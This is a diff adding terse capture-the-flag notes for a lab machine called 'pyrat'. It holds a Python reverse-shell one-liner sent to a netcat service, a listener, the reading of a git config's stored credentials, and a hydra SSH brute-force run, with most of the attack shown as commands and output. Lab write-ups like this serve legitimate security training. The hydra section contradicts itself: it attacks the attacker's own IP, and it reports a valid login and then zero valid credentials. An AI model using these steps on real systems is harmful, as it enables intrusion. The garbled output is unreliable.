@@ -1,0 +1,63 @@
+After Scan -
+
+~>  nc 10.10.133.216 8000 
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.20",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+#comment - In ip add VPN IP through - curl 10.10.10.10/whoami > 10.9.1.20 My VPN IP
+
+
+~> python -m http.server 8001 (start the server for wget Download)
+
+
+~> nc -lvnp 9001 (Listen the port 9001 from -> nc 10.10.133.216 8000 )
+$ whoami
+www-data
+$ cat /opt/dev/.git/config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Jose Mario
+        email = josemlwdf@github.com
+
+[credential]
+        helper = cache --timeout=3600
+
+[credential "https://github.com"]
+        username = think
+        password = 🔒 
+$ admin
+/bin/sh: 16: admin: not found
+$ 
+
+~>ssh think@10.10.133.216
+password:🔒
+pyrat$ ls
+Norc user.txt
+
+pyrat$ cat user.txt
+# You will get user flag 🚩 
+
+
+~> hydra -L rockyou.txt  -P rockyou.txt  ssh://10.10.133.216 -t 
+Hydra v9.4 (c) 2024 by van Hauser/THC and David Maciejak - for legal purposes only
+
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 3 seconds between tries
+[DATA] attacking ssh://10.9.1.20:22/
+[22][ssh] host: 10.9.1.20   login: admin   password: abc123   → valid credentials
+[22][ssh] host: 10.9.1.20   login: root    password: 123456   → Invalid credentials
+[22][ssh] host: 10.9.1.20   login: user1   password: qwerty   → Invalid credentials
+[STATUS] Attack completed with 0 valid credentials found.
+
+
+~>nc 10.10.133.216 8000 
+admin
+password:abc123
+$ root.txt
+# You will get root flag 🚩 
+
+
+
+
